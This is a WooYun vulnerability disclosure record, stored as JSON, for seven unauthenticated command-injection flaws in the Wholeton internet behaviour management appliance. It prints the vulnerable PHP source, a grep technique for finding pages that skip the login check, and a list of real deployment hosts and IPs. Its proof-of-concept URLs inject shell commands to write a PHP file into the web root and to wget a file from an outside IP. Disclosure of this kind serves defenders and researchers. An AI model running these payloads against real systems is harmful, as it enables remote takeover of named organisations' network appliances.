{"id": 23712, "wybug_id": "wooyun-2015-0103774", "wybug_title": "惠尔顿上网行为管理系统命令执行七处（无需登录）", "wybug_corp": "惠尔顿", "wybug_author": "xfkxfk", "wybug_date": "2015-03-26 18:12", "wybug_open_date": "2015-06-29 11:08", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向公众公开  简要描述： 惠尔顿上网行为管理系统命令执行七处，都是无需登录的，直接GetShell。附上同一类漏洞快速定位的小技巧，再也不用一个一个审计了。 详细说明：  官网经典案例：http://www.wholeton.com/Anli.php外网部分实际案例：\n1.https://test.bescar.com2.https://angelic.com.cn/3.http://222.223.56.1164.https://222.92.15.1005.http://111.206.133.4/6.http://mail.hualiu.cc/\n首先代码审计估计大家都有自己的辅助工具这里介绍一下自己的方法吧。首先拿到源码，使用seay牛的审计工具，从系统入口进入，看看全局有什么设置比如全局过滤，伪全局机制，全局判断登录验证等等知道了系统的全局过滤处理及参数值传输过程之后就好办下面以查找全局越权+命令执行=无需登陆命令执行漏洞为例首先惠尔顿上网行为管理系统是需要登录才能操作的通过度系统源码知道了每个文件的开头：\ninclude_once \"$RootDir/include/gblinclude.php\";\n这一句就是验证登录状态的如果没有这一句就导致越权操作了，那么我们先来找出越权的文件以下我们在/base目录下进行：\nfind -name '*.php' | xargs grep -L -e 'gblinclude' > no_gblinclude.txt\n这样可以找出/base目录下全部的越权操作文件了然后我们在从no_gblinclude.txt中找出命令执行的文件：\nless no_gblinclude.txt | xargs grep -l 'exec(' | wc -l找出exec函数可能造成的命令执行less no_gblinclude.txt | xargs grep -l 'system(' | wc -l找出system函数可能造成的命令执行less no_gblinclude.txt | xargs grep -l 'shell_exec(' | wc -l找出shell_exec函数可能造成的命令执行\n\n\n这个时候就把范围缩得很小了，剩下的自己写个脚本跑一下，或者自己手工一个一个看一下，也很快就能搞定那些无需登录的命令执行漏洞了我们从上面那些里面找出能直接利用的如下（除去前面已发的）：\nbase/user/offLine.phpbase/vpn/uf.phpbase/vpn/netgatedel.phpbase/vpn/rdpdel.phpbase/vpn/userdel.phpbase/networking/ipbindmac_gateway.phpbase/message/ajaxGoAuth.php\n加上之前已经提交的这里准确率已经达到40%左右了，当然还可以仔细过滤第一处base/user/offLine.php\n<?php \t$thisfile = basename($_SERVER['PHP_SELF']);\t$RootDir = $_SERVER[\"DOCUMENT_ROOT\"].'/base/';\tinclude_once \"$RootDir/include/database.php\";\tglobal $gblDBConnect;\t$id = \"\\\"\".$_REQUEST['id'].\"\\\"\";\t$sql_login =\"select * from tb_user_login where Id=\".$id ;\t$data_login= $gblDBConnect->getOne($sql_login);\t$sql_del = \"delete from tb_user_login where Id=\".$id .\" and LoginIP='\".$data_login->LoginIP.\"'\";\ttry\t{\t\t$dataList_id = $gblDBConnect->execute($sql_del);\t\tchdir(\"/usr/local/WholetonTM/triton/bin\");\t\texec(\"./TritonIPCTools -u \".$_REQUEST['user']);\t\techo \"<script> window.location.href='onLineUser.php';</script>\";\t}\tcatch(PDOException $ex)\t{\t\t\tLogError(\"SQL  ___ \".$sql_del);\t}?>\n参数user直接进入了exec中了第二处base/vpn/uf.php，这里存在三处漏洞\n<?php$cmd =$_REQUEST[\"cmd\"];if($cmd == \"add\"){  $userid =$_REQUEST[\"user\"];  $pswd =$_REQUEST[\"pswd\"];  $loginuser = $_REQUEST[\"winuser\"];  $loginpswd = $_REQUEST[\"winpswd\"];  $netcontrol=\"0\";  $mobile=\"1\";  $ikey=\"0\";  $userpin = '';  $keypswd = '';  $authenticator = '';  $sa = '';  $caflag = '';  system(\"/usr/local/WholetonTM/socks5/ConfigServer add user $userid $pswd $mobile '$authenticator' $ikey '$userpin' '$keypswd' $loginuser $loginpswd '$sa' $netcontrol '$caflag'\");  //exec(\"./ConfigServer add user $userid $pswd $mobile $authenticator $ikey $userpin $keypswd $loginuser $loginpswd $sa $netcontrol $caflag\",$aa);  echo \"/usr/local/WholetonTM/socks5/ConfigServer add user $userid $pswd $mobile '$authenticator' $ikey '$userpin' '$keypswd' $loginuser $loginpswd '$sa' $netcontrol '$caflag'\";\t  sleep(1);  //set access after add  exec(\"/usr/webmin/ipsec/ConfigServer query app\",$resultallApps); // print_r($resultallApps);  for($i = 0;$i < count($resultallApps);$i++)  {      $resallApps=explode(\"\\t\",$resultallApps[$i]);      if($resallApps[0])      {\t$resultuserIn = array();          exec(\"/usr/webmin/ipsec/ConfigServer query access $resallApps[0]\",$resultuserIn);          $allaccess1=explode(\"\\t\",$resultuserIn[0]);          $userIn[]=$userid;          for($j = 0;$j < count($allaccess1);$j++)          {              $userIn[]=$allaccess1[$j];          }          $temp = implode(\" \",$userIn);          exec(\"/usr/webmin/ipsec/ConfigServer update access $resallApps[0] \\\" $temp \\\"\");          unset($userIn);          $temp=\"\";          $allaccess1=\"\";      }      $resallApps=\"\";  }}if($cmd == \"del\"){  $userName =$_REQUEST[\"user\"];  exec(\"/usr/webmin/ipsec/ConfigServer del user $userName\");}if($cmd == \"mod\"){  $userid =$_REQUEST[\"user\"];  $pswd =$_REQUEST[\"pswd\"];  $loginuser = $_REQUEST[\"winuser\"];  $loginpswd = $_REQUEST[\"winpswd\"];  $netcontrol=\"0\";  $mobile=\"1\";  $ikey=\"0\";  $userpin = \"\\\"\\\"\";  $keypswd = \"\\\"\\\"\";  $authenticator = \"\\\"\\\"\";  $sa = \"\\\"\\\"\";  $caflag = \" \\\"\\\" \";  exec(\"/usr/webmin/ipsec/ConfigServer update user $userid $pswd $mobile $authenticator $ikey $userpin $keypswd $loginuser $loginpswd $sa $netcontrol $caflag\");}exec(\"/etc/socks5/Reset\");?>\n这里当参数cmd为add，del，mod时均存在命令执行漏洞第三处base/vpn/netgatedel.php\n<?php$path=\"/etc/socks5/config.xml\";$siteid =$_REQUEST[\"siteid\"]; chdir(\"/usr/local/WholetonTM/socks5/\");system(\"./ConfigServer del gateway $siteid\");print(\" <script> location.href='netgate.php'; </script> \");?>\n这里参数siteid直接进入system中第四处base/vpn/rdpdel.php\n<?php$appName =$_REQUEST[\"appName\"]; system(\"/usr/local/WholetonTM/socks5/ConfigServer del app $appName\");print(\" <script> location.href='rdp.php'; </script> \");?>\n这里参数appName 直接进入system函数中第五处base/vpn/userdel.php\n<?php$userName =$_REQUEST[\"userName\"]; system(\"/usr/local/WholetonTM/socks5/ConfigServer del user $userName\");print(\" <script> location.href='usermanage.php'; </script> \");?>\n这里参数userName直接进入system中第六处base/networking/ipbindmac_gateway.php\n<?php\tinclude(\"filename.php\");\t//?急?蝵\t$network = $_REQUEST['gateway'];\t$ip_mask = explode(\"/\",$network);\t$gateway =  $ip_mask[0].\"/\".computer($ip_mask[1]);\texec(\"/usr/local/WholetonTM/sbin/nbtscan -m \".$gateway,$info);\t$gateway_info = array();\tfor($i = 0;$i<count($info);$i++){\t\t$info1 = explode(\" \",$info[$i]);\t\t$info2 = array();\t\t$info3 = array();\t\tfor($ii =0;$ii<count($info1);$ii++ ){\t\t\tif($info1[$ii]!=\"\"){\t\t\t\t$info2[] = $info1[$ii];\t\t\t}\t\t}\t\tfor($n = 0;$n<count($info2);$n++){\t\t\t$computer = explode(\"\\\\\",$info2[1]);\t\t\t$info3 = array($info2[0],$info2[2]);\t\t}\t\t$gateway_info [] = $info3;\t}\techo json_encode($gateway_info);?>\n参数gateway通过处理后直接进入exec中第七处base/message/ajaxGoAuth.php\n<?php $ip = $_REQUEST['ip'];$type = $_REQUEST['type'];switch ($type) {\tcase 'sms':\t    $parameter = \"-s \";\t\tbreak;\tcase 'welcome':\t    $parameter = \"-w \";\t\tbreak;}exec(str_replace(\";\", \"\", \"/usr/local/WholetonTM/triton/bin/TritonIPCTools \".$parameter.$ip));?>\n这里参数ip进入exec中，虽然过滤了分号，但是不影响漏洞利用嘛   漏洞证明：  这里以第一处和第七处进行演示，其他的原来都一样，直接拼接命令，即可执行了第一处证明：\nhttps://test.bescar.com/base/user/offLine.php?id=1&user=111111;echo '<?php phpinfo();?>'>/usr/local/WholetonTM/htdocs/111111.php\n这时会在根目录下生成111111.php文件\n\n第二处证明：由于这里过滤的;，分号，不能直接写php代码到文件，当然方法很多了\nhttps://test.bescar.com/base/message/ajaxGoAuth.php?type=sms&ip=222222|cat /usr/local/WholetonTM/htdocs/111111.php>/usr/local/WholetonTM/htdocs/222222.php或者https://test.bescar.com/base/message/ajaxGoAuth.php?type=sms&ip=222222|wget http://222.223.56.116/222222.php\n这时会在根目录下生成222222.php文件\n\n   修复方案：  重写吧。。。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-03-31 11:07 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-27 20:15 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  坐等小技巧~    \n     2015-06-29 14:54 |    \t\tHckmaple \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:14        | ~~~)\t\t \n  学习了    \n     2015-06-29 21:47 |    \t\tTh1nk \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:21        | 关注苍老师与波多野老师)\t\t \n  收藏~    \n     2015-07-02 15:02 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  直接就要重写了……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}